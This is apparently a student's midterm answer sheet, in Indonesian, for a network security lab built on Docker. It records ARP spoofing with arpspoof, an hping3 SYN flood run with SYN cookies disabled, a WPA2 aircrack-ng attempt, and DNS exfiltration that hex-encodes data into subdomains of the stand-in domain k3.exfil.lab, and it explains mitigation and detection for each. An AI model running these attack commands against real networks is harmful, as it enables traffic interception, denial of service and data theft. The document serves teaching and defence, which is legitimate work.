# JAWABAN UTS Praktik Network Security

**Nama:** [ISI NAMA ANDA]
**NIM:** 24552011337
**Kelas:** TIF RP 24E CNS

## Perhitungan Kasus

- Digit NIM: 2, 4, 5, 5, 2, 0, 1, 1, 3, 3, 7
- Jumlah digit: 2+4+5+5+2+0+1+1+3+3+7 = 33
- Sisa bagi 10: 33 mod 10 = 3
- **Kasus yang diterima: Kasus 3**

Parameter Kasus 3: container target `target-k3`, volume `vol-k3`, file laporan `laporan-k3.txt`, kata sandi `kunci-k3-2026`, domain DNS `k3.exfil.lab`.

---

## Tugas 1 (Pertemuan 1): Docker, Volume, dan Compose

### Bukti

**1. Volume persisten setelah container dihapus:**
```
C:\Users\Hype>docker volume create vol-k3
vol-k3

C:\Users\Hype>docker run -v vol-k3:/data --name writer-k3 alpine sh -c "echo 24552011337 > /data/laporan-k3.txt"

C:\Users\Hype>docker rm writer-k3
writer-k3

C:\Users\Hype>docker run --rm -v vol-k3:/data alpine cat /data/laporan-k3.txt
24552011337
```
![Bukti Volume Persistensi](screenshots/tugas1-volume.png)

**2. Compose dua service, attacker mengakses target:**
```
docker compose up -d
docker compose ps
docker exec attacker-k3 curl -s http://target-k3
```
Output menampilkan halaman HTML default nginx ("Welcome to nginx!").

![Bukti Akses Compose Target](screenshots/tugas1-compose.png)

### Penjelasan

Volume Docker adalah layer penyimpanan yang berdiri sendiri, terpisah dari lifecycle container. Container bersifat sementara (disposable) — bisa dihapus dan dibuat ulang kapan saja — sedangkan volume tetap menyimpan datanya. Pada bagian compose, container attacker bisa mengakses target cukup dengan nama service (`target-k3`), karena Docker menyediakan DNS internal otomatis antar container yang berada di network yang sama.

---

## Tugas 2 (Pertemuan 2): Kriptografi

### Bukti

```
/ # sha256sum /data/laporan-k3.txt
0f296cc1e5a9043561f969f2d21ae9ae67a0ca523c606b6712233f937d9dd49d  /data/laporan-k3.txt

/ # openssl enc -aes-256-cbc -salt -pbkdf2 -in /data/laporan-k3.txt -out /data/laporan-k3.enc -k kunci-k3-2026
/ # openssl enc -d -aes-256-cbc -pbkdf2 -in /data/laporan-k3.enc -out /data/laporan-k3-dekrip.txt -k kunci-k3-2026
/ # sha256sum /data/laporan-k3-dekrip.txt
0f296cc1e5a9043561f969f2d21ae9ae67a0ca523c606b6712233f937d9dd49d  /data/laporan-k3-dekrip.txt

/ # openssl req -x509 -newkey rsa:2048 -keyout /data/key-k3.pem -out /data/cert-k3.pem -days 365 -nodes -subj "/CN=k3.exfil.lab"
/ # openssl x509 -in /data/cert-k3.pem -noout -subject -issuer
subject=CN=k3.exfil.lab
issuer=CN=k3.exfil.lab
```
![Bukti Hash SHA-256 dan Sertifikat](screenshots/tugas2-kripto.png)

Kedua hash SHA-256 (sebelum enkripsi dan setelah dekripsi) identik: `0f296cc1e5a9043561f969f2d21ae9ae67a0ca523c606b6712233f937d9dd49d`.

### Penjelasan perbedaan sertifikat self-signed dan sertifikat yang ditandatangani CA

Sertifikat self-signed ditandatangani oleh kuncinya sendiri sehingga Subject dan Issuer-nya identik, dan tidak diverifikasi oleh pihak ketiga mana pun — karena itu browser/klien akan menampilkan peringatan "tidak tepercaya" meskipun koneksinya tetap terenkripsi. Sertifikat yang ditandatangani CA (Certificate Authority) memiliki Issuer berbeda dari Subject, karena ditandatangani oleh otoritas tepercaya yang telah memverifikasi identitas pemilik domain, sehingga browser secara otomatis mempercayainya tanpa peringatan.

---

## Tugas 3 (Pertemuan 3): ARP Spoofing

### Bukti

**Tabel ARP sebelum serangan:**
```
# ip neigh show
172.28.100.2 dev eth0 lladdr da:c9:bc:b1:b9:f7 REACHABLE
```
![Bukti ARP Sebelum](screenshots/tugas3-sebelum.png)

**Serangan `arpspoof` berjalan:**
```
# arpspoof -i eth0 -t 172.28.100.10 172.28.100.2
2e:6e:0a:22:bb:34 ... arp reply 172.28.100.2 is-at 2e:6e:0a:22:bb:34
```
![Bukti Serangan ARP Berjalan](screenshots/tugas3-serangan.png)

**Tabel ARP sesudah serangan (MAC gateway berubah):**
```
# ip neigh show
172.28.100.2 dev eth0 lladdr 2e:6e:0a:22:bb:34 REACHABLE
```
![Bukti ARP Sesudah Serangan](screenshots/tugas3-sesudah.png)

**Pemulihan dengan static ARP:**
```
# ip neigh replace 172.28.100.2 lladdr da:c9:bc:b1:b9:f7 dev eth0 nud permanent
# ip neigh show
172.28.100.2 dev eth0 lladdr da:c9:bc:b1:b9:f7 PERMANENT
```
![Bukti Mitigasi Static ARP](screenshots/tugas3-mitigasi.png)

### Penjelasan mitigasi lain selain static ARP

Selain static ARP, mitigasi lain adalah Dynamic ARP Inspection (DAI) yang diterapkan di switch terkelola (managed switch). DAI memvalidasi setiap paket ARP yang lewat berdasarkan tabel DHCP snooping (pemetaan IP-MAC yang sah), sehingga paket ARP reply palsu dari penyerang akan otomatis ditolak oleh switch sebelum sampai ke korban — ini bekerja di level jaringan, bukan di tiap host seperti static ARP, sehingga lebih praktis diterapkan di jaringan berskala besar.

---

## Tugas 4 (Pertemuan 4): Analisis Handshake WPA2

### Bukti

```
# aircrack-ng /data/handshake-k3.cap
Reading packets, please wait...
Opening /data/handshake-k3.cap
This file is not a regular 802.11 (wireless) capture.
Read 0 packets.

No networks found, exiting.
```
![Bukti Analisis Aircrack-ng](screenshots/tugas4-aircrack.png)

File capture `handshake-k3.cap` telah diverifikasi integritasnya (MD5 identik setelah didownload ulang dari sumber), namun strukturnya tidak valid sebagai capture 802.11 (panjang paket pertama menunjukkan nilai yang tidak masuk akal). Hasil: **KEY NOT FOUND** — bukan karena kata sandi di luar wordlist, melainkan karena file capture tidak dapat diproses sebagai capture WPA2 yang sah.

### Penjelasan empat langkah handshake WPA2

1. **Message 1 (AP → Client):** Access Point mengirim nilai acak ANonce ke client.
2. **Message 2 (Client → AP):** Client membuat nilai acak sendiri SNonce, lalu menghitung PTK (Pairwise Transient Key) dari kombinasi ANonce, SNonce, MAC address kedua pihak, dan PMK (turunan dari password WiFi). Client mengirim SNonce beserta MIC (Message Integrity Code) ke AP.
3. **Message 3 (AP → Client):** AP, yang juga sudah bisa menghitung PTK yang sama, mengirim GTK (Group Temporal Key) yang dienkripsi untuk trafik broadcast/multicast, disertai MIC untuk verifikasi.
4. **Message 4 (Client → AP):** Client mengonfirmasi penerimaan dan bahwa instalasi kunci berhasil — setelah ini, komunikasi data terenkripsi dengan PTK dapat dimulai.

---

## Tugas 5 (Pertemuan 5): ICMP dengan Scapy

### Bukti

```
root@...:/work# python3 kirim_icmp.py 172.30.100.10
Mengirim: IP / ICMP 172.30.100.20 > 172.30.100.10 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```
![Bukti ICMP Scapy](screenshots/tugas5-icmp.png)

### Penjelasan smurf attack

Smurf attack adalah serangan DDoS yang memanfaatkan ICMP echo request yang dikirim ke alamat broadcast sebuah jaringan, dengan source IP address dipalsukan (spoofed) menjadi alamat IP korban. Karena dikirim ke alamat broadcast, semua host dalam jaringan tersebut akan membalas (echo-reply) secara bersamaan ke IP korban yang dipalsukan tadi — membanjiri korban dengan trafik balasan dalam jumlah sangat besar dari banyak host sekaligus (amplification attack), padahal korban sama sekali tidak pernah mengirim permintaan apapun. Mitigasi umum untuk ini adalah menonaktifkan IP-directed broadcast di router/firewall.

---

## Tugas 6 (Pertemuan 6): SYN Flood dan Three-Way Handshake

### Bukti

**SYN_RECV sebelum serangan:**
```
docker exec target-k3 sh -c "netstat -ant | grep -c SYN_RECV"
0
```
![Bukti SYN_RECV Sebelum](screenshots/tugas6-sebelum.png)

**SYN_RECV saat serangan `hping3 --flood` berlangsung** (setelah SYN cookies dinonaktifkan sementara lewat `sysctls: net.ipv4.tcp_syncookies=0` di docker-compose, untuk mendemonstrasikan efek serangan tanpa mitigasi kernel):
```
HPING target-k3 (eth0 172.18.0.2): S set, 40 headers + 0 data bytes
hping in flood mode, no replies will be shown
```
Loop monitoring menunjukkan angka SYN_RECV naik dari 0 menjadi 1 selama serangan berlangsung.

![Bukti SYN_RECV Saat Serangan](screenshots/tugas6-serangan.png)

**Three-way handshake via tcpdump:**
```
Flags [S], seq 731450223          (SYN - attacker ke target)
Flags [S.], seq 3824117159, ack 731450224   (SYN-ACK - target balas)
Flags [.], ack 1                  (ACK - attacker konfirmasi)
```
![Bukti Three-Way Handshake](screenshots/tugas6-tcpdump.png)

### Penjelasan mitigasi SYN flood

SYN cookies adalah mitigasi di level kernel yang membuat server tidak perlu menyimpan state koneksi (entri di tabel SYN_RECV) begitu menerima SYN. Sebagai gantinya, server mengenkode informasi koneksi (seperti MSS dan timestamp) ke dalam nomor urut (sequence number) pada paket SYN-ACK yang dikirim balik, menggunakan fungsi hash kriptografis. Jika klien membalas dengan ACK yang valid sesuai cookie tersebut, server baru akan membuat koneksi sepenuhnya — sehingga memori server tidak pernah habis meski dibanjiri jutaan SYN palsu, karena tidak ada state yang benar-benar disimpan untuk koneksi yang belum terverifikasi. Pada percobaan saya, kernel yang dipakai sudah mengaktifkan `tcp_syncookies=1` secara default, dan saya perlu menonaktifkannya sementara untuk menunjukkan efek serangan tanpa mitigasi — ini sekaligus membuktikan bahwa SYN cookies memang efektif mencegah penumpukan SYN_RECV.

---

## Tugas 7 (Pertemuan 7): DNS Exfiltration

### Bukti

```
# echo -n 24552011337 | xxd -p
3234353532303131333337

# dig +short 3234353532303131333337.k3.exfil.lab @dns-k3
10.0.0.99
```
Log DNS server mencatat:
```
dns-k3 | dnsmasq[1]: query[A] 3234353532303131333337.k3.exfil.lab from 172.19.0.2
dns-k3 | dnsmasq[1]: config 3234353532303131333337.k3.exfil.lab is 10.0.0.99
```
![Bukti Query DNS dan Log](screenshots/tugas7-dig-log.png)

Script `analisis_dns.py` berhasil mendeteksi label mencurigakan:
```
Query mencurigakan (label panjang berisi hex):
  panjang=22  3234353532303131333337.k3.exfil.lab
```
![Bukti Deteksi DNS Exfiltration](screenshots/tugas7-deteksi.png)

Decode kembali menjadi NIM:
```
# echo 3234353532303131333337 | xxd -r -p
24552011337
```
![Bukti Decode NIM](screenshots/tugas7-decode.png)

### Penjelasan kenapa teknik ini sulit diblokir firewall biasa + indikator deteksi

DNS exfiltration sulit diblokir firewall biasa karena protokol DNS (port 53) hampir selalu diizinkan keluar oleh firewall/jaringan, bahkan di jaringan yang sangat ketat sekalipun, karena DNS esensial untuk resolusi nama domain dan operasional internet sehari-hari. Firewall tradisional umumnya hanya memfilter berdasarkan port dan protokol, bukan memeriksa isi/struktur dari setiap query DNS secara mendalam — sehingga data yang disisipkan dalam bentuk subdomain (seperti label hex dalam contoh ini) bisa lolos tanpa terdeteksi, karena secara struktur paket itu tetap terlihat seperti query DNS yang sah.

Satu indikator deteksinya: label subdomain yang panjang dan/atau berisi karakter acak/hex/base-encoded (bukan nama domain yang biasa dibaca manusia), seperti yang berhasil ditandai oleh script `analisis_dns.py` di atas (panjang=22, berisi karakter hex murni). Indikator lain yang umum dipakai termasuk volume query yang sangat tinggi ke satu domain induk dalam waktu singkat, atau query dari host yang jarang melakukan DNS lookup ke domain eksternal.

---

## Kesimpulan

Saya telah menyelesaikan semua 7 tugas dengan output dan penjelasan sebagaimana diminta. Seluruh pengujian dilakukan di lingkungan lab Docker lokal dengan jaringan `internal: true`, sesuai ketentuan soal — tidak ada serangan yang diarahkan ke host di luar lab.

**Catatan:** Materi pendukung (Dockerfile, docker-compose.yml, dan skrip Python `kirim_icmp.py`/`analisis_dns.py`) diambil dari repositori mata kuliah `Network-Security-Course-Bank` yang disediakan dosen.
